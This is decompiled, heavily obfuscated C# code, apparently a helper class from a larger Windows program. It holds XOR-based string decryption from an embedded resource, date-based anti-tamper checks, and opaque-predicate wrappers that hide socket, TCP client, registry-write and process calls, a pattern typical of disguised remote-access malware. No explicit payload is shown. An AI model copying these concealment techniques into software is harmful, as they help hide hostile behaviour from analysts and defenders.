using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using O;

namespace ns0;

internal sealed class Class14
{
	private sealed class Class15
	{
		public static readonly Class15 class15_0;

		internal byte[] byte_0;

		static Class15()
		{
			if (smethod_2(Class11.smethod_1(831, '\u0347'), new DateTime(635781201192722452L), 441, 504))
			{
				throw new Exception();
			}
			class15_0 = new Class15();
		}

		private Class15()
		{
			Assembly assembly = (Assembly)(ICustomAttributeProvider)GForm1.smethod_2(87, 'G');
			Stream stream = (Stream)(IDisposable)assembly.GetManifestResourceStream(smethod_1());
			if (stream != null)
			{
				byte[] array = (byte_0 = new byte[256]);
				stream.Read(byte_0, 0, byte_0.Length);
			}
		}

		public string method_0(string string_0, int int_0)
		{
			int num = GClass2.DRV.smethod_1(string_0, 961, 927);
			int num2 = int_0 & 0xFF;
			char[] array = (char[])(Array)string_0.ToCharArray();
			while (--num >= 0)
			{
				array[num] = (char)(array[num] ^ (byte_0[num2] | int_0));
			}
			return string.Intern(new string(array));
		}
	}

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 2115)]
	private struct Struct9
	{
	}

	internal static byte byte_0/* Not supported: data(00) */;

	public static string smethod_0(string string_0, int int_0)
	{
		if (smethod_2(Class11.smethod_1(992, 'Θ'), new DateTime(635781201193392491L), 606, 543))
		{
			throw new Exception();
		}
		return string.Intern(Class15.class15_0.method_0(string_0, int_0));
	}

	[SpecialName]
	public static string smethod_1()
	{
		return Class16.smethod_0("\uf597\uf5ca\uf590\uf5ca\uf5c0\uf5cb\uf5c6\uf596\uf5c0\uf595\uf595\uf597\uf5c7\uf591\uf592\uf5c3\uf5cb\uf592\uf5c2\uf5cb\uf5cb\uf596\uf5c6\uf5c7\uf5c7\uf5c1\uf5cb\uf5c2\uf592\uf5c7\uf5ca\uf5c5", 62945);
	}

	internal static bool smethod_2(DateTime dateTime_0, DateTime dateTime_1, int int_0, int int_1)
	{
		int num = 0;
		bool result = (((int_1 ^ int_0) - 65) ^ 0) switch
		{
			0 => dateTime_0 > dateTime_1, 
			_ => false, 
		};
		num++;
		return result;
	}

	internal static string smethod_3(int int_0, char char_0, char char_1)
	{
		int num = 0;
		string result = (((char_0 ^ char_1) - 24) ^ 0) switch
		{
			0 => Conversions.ToString(int_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_4<T>(T gparam_0, char char_0, char char_1) where T : Socket
	{
		int num = 0;
		int result;
		int num2;
		do
		{
			result = (((char_0 ^ char_1) - 34) ^ num) switch
			{
				0 => gparam_0.Available, 
				_ => 13, 
			};
			num++;
			num2 = char_1 * char_1;
			num2 = char_1 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_5<T>(T gparam_0, char char_0, int int_0) where T : TcpClient
	{
		int num = 0;
		switch (((char_0 ^ int_0) - 113) ^ 0)
		{
		case 0:
			gparam_0.Close();
			break;
		}
		num++;
	}

	internal static double smethod_6<T>(T gparam_0, char char_0, short short_0) where T : string
	{
		int num = 0;
		double result;
		int num2;
		do
		{
			result = (((char_0 ^ short_0) - 126) ^ num) switch
			{
				0 => Conversion.Val((string)gparam_0), 
				_ => 0.5403916031236138, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_7<T, U>(T gparam_0, U gparam_1, int int_0, int int_1) where T : Control where U : Font
	{
		int num = 0;
		switch (((int_1 ^ int_0) - 82) ^ 0)
		{
		case 0:
			((Control)gparam_0).set_Font((Font)(object)gparam_1);
			break;
		}
		num++;
	}

	internal static Graphics smethod_8<T>(T gparam_0, short short_0, int int_0) where T : Image
	{
		int num = 0;
		Graphics result;
		int num2;
		do
		{
			result = (Graphics)((((int_0 ^ short_0) - 16) ^ num) switch
			{
				0 => (IDisposable)Graphics.FromImage((Image)(object)gparam_0), 
				_ => null, 
			});
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_9<T, U, V>(U gparam_0, T gparam_1, V gparam_2, char char_0, short short_0) where U : Hashtable
	{
		int num = 0;
		switch (((short_0 ^ char_0) - 22) ^ 0)
		{
		case 0:
			gparam_0.Add(gparam_1, gparam_2);
			break;
		}
		num++;
	}

	internal static void smethod_10<T>(T gparam_0, short short_0, short short_1) where T : Control
	{
		int num = 0;
		switch (((short_1 ^ short_0) - 101) ^ 0)
		{
		case 0:
			((Control)gparam_0).Show();
			break;
		}
		num++;
	}

	internal static DirectoryInfo smethod_11<T>(T gparam_0, short short_0, char char_0) where T : DriveInfo
	{
		int num = 0;
		DirectoryInfo result = (((char_0 ^ short_0) - 82) ^ 0) switch
		{
			0 => gparam_0.RootDirectory, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static long smethod_12<T>(T gparam_0, char char_0, short short_0) where T : Process
	{
		int num = 0;
		long result;
		do
		{
			result = (((char_0 ^ short_0) - 86) ^ num) switch
			{
				0 => gparam_0.PrivateMemorySize64, 
				_ => 0L, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static string smethod_13(DateTime dateTime_0, int int_0, short short_0)
	{
		int num = 0;
		string result = (((short_0 ^ int_0) - 49) ^ 0) switch
		{
			0 => (string)(IEnumerable<char>)Conversions.ToString(dateTime_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_14<T, U, V>(V gparam_0, U gparam_1, T gparam_2, int int_0, int int_1) where U : string where V : RegistryKey
	{
		int num = 0;
		switch (((int_0 ^ int_1) - 76) ^ 0)
		{
		case 0:
			gparam_0.SetValue(gparam_1, gparam_2);
			break;
		}
		num++;
	}

	internal static void smethod_15<T>(T gparam_0, FormBorderStyle formBorderStyle_0, int int_0, char char_0) where T : Form
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		switch (((char_0 ^ int_0) - 21) ^ 0)
		{
		case 0:
			((Form)gparam_0).set_FormBorderStyle(formBorderStyle_0);
			break;
		}
		num++;
	}
}
